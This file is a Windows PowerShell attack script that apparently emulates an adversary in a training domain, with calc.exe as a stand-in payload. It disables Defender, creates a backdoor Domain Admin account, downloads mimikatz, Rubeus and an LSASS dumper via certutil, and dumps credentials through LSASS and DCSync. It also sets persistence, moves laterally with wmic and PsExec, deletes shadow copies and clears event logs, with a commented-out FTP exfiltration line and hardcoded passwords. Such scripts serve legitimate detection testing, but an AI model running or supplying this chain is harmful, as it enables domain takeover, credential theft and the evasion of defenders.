Set-MpPreference -DisableRealtimeMonitoring $true;
Set-MpPreference -DisableScriptScanning $true;
Set-MpPreference -DisableBehaviorMonitoring $true;
Set-MpPreference -DisableIOAVProtection $true;
Set-MpPreference -DisableIntrusionPreventionSystem $true;
Add-MpPreference -ExclusionPath "C:\Users\ADMINI~1\AppData\Local\Temp";
Add-MpPreference -ExclusionPath "C:\Windows\Temp";
cp C:\Windows\System32\calc.exe C:\Windows\Temp;
C:\Windows\Temp\calc.exe;
net user guest /active:yes;
tasklist.exe > process.log;
net.exe start > serviceList.txt;
ipconfig /all > networkinfo.txt; netsh interface show interface >> networkinfo.txt; arp -a >> networkinfo.txt; nbtstat -n >> networkinfo.txt; net config >> networkinfo.txt;
Get-ADDomain > domaininfo.log;
netsh advfirewall firewall show rule name=all > firewallinfo.txt;
net view /domain;
nltest.exe /dclist:dsocbootcamp01.lab > dclist.txt;
cmd.exe /C whoami > usersInfo.txt; wmic useraccount get /ALL >> usersInfo.txt;
net user /domain;
net group /domain;
$hostname = hostname;
query user /SERVER:$hostname;
#$client = New-Object System.Net.WebClient;
#$client.Credentials = New-Object System.Net.NetworkCredential("ftpuser", "D3v3L.2050");
#$client.UploadFile("ftp://10.13.38.249/dclist.txt", "C:\Users\ADMINI~1\AppData\Local\Temp\dclist.txt");
# Import AD module
Import-Module ActiveDirectory
# Create the AD User
New-ADUser `
-Name "Darkoo" `
-GivenName "Darkoo" `
-Surname "Bukeleo" `
-UserPrincipalName "darkoo" `
-AccountPassword (ConvertTo-SecureString "P@$$w0rd123" -AsPlainText -Force) `
-Enabled 1;
Add-ADGroupMember -Identity "Domain Admins" -Members darkoo;
certutil.exe -urlcache -split -f https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip C:\Windows\Temp\katz.zip;
certutil.exe -urlcache -split -f https://github.com/Al1ex/AdFind/archive/refs/heads/master.zip C:\Windows\Temp\AdFind.zip;
certutil.exe -urlcache -split -f https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1 C:\Windows\Temp\ADRecon.ps1;
certutil.exe -urlcache -split -f https://download.sysinternals.com/files/PSTools.zip C:\Windows\Temp\PsTools.zip;
certutil.exe -urlcache -split -f https://github.com/Offensive-Panda/LsassReflectDumping/blob/main/ReflectDump/x64/Release/ReflectDump.exe C:\Windows\Temp\ReflectDump.exe;
Invoke-WebRequest "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/archive/refs/heads/master.zip" -OutFile "C:\Windows\Temp\ghost.zip";
C:\Windows\Temp\ReflectDump.exe;
Expand-Archive -Path C:\Windows\Temp\ghost.zip -DestinationPath C:\Windows\Temp;
cd 'C:\Windows\Temp\Ghostpack-CompiledBinaries-master\dotnet v4.7.2 compiled binaries\';
.\Rubeus.exe asktgt /user:administrator /password:D3v3L.2050 > C:\Windows\Temp\creds.log;
cd C:\Windows\Temp;
Expand-Archive -Path katz.zip -DestinationPath C:\Windows\Temp;
Expand-Archive -Path AdFind.zip -DestinationPath C:\Windows\Temp;
Expand-Archive -Path PsTools.zip -DestinationPath C:\Windows\Temp;
New-Item -Path "C:\Users\ADMINI~1\AppData\Local\Temp\payload.txt" -ItemType File;
Set-Content -Path "C:\Users\ADMINI~1\AppData\Local\Temp\payload.txt" -Value "Ransomware";
cd C:\Users\ADMINI~1\AppData\Local\Temp;
certutil -encode payload.txt encodedOutputFileName.txt;
Invoke-Expression "C:\Windows\Temp\ADRecon.ps1";
C:\Windows\Temp\AdFind-master\AdFind.exe -sc u:administrator;
Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\Users\ADMINI~1\AppData\Local\Temp\Procdump.zip";
Expand-Archive -Path Procdump.zip -DestinationPath C:\Users\ADMINI~1\AppData\Local\Temp;
C:\Users\ADMINI~1\AppData\Local\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp;
schtasks /create /tn "T1053_005_On_Logon" /sc onlogon /tr "cmd.exe /c calc.exe";
schtasks /create /tn "T1053_005_On_Startup" /sc onstart /ru system /tr "cmd.exe /c calc.exe";
#dumping credentials with mimikatz
C:\Windows\Temp\mimikatz-master\x64\mimikatz.exe "lsadump::dcsync /domain:tdirlabs.security /user:administrator@tdirlabs.security" "exit" > C:\Windows\Temp\lsadmp.log;
$action = New-ScheduledTaskAction -Execute 'calc.exe';
$trigger = New-ScheduledTaskTrigger -Daily -At 6am;
Register-ScheduledTask -Action $action -Trigger $trigger -TaskPath "My Tasks" -TaskName "Pwned!" -Description "Start calc at 6am daily";
wmic /node:"10.3.64.233" /user:tdirlabs\Administrator /password:D3v3L.2050 process call create "C:\Windows\System32\calc.exe";
#add exe to reg key
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Yep!" /t REG_SZ /F /D "C:\Windows\System32\calc.exe";
vssadmin delete shadows /All;
#cmd clear logs
WevtUtil cl System;
WevtUtil cl Application;
WevtUtil cl Security;
C:\Windows\Temp\PsExec64.exe -i -s -u tdirlabs\administrator -p D3v3L.2050 \\10.3.64.233 cmd;
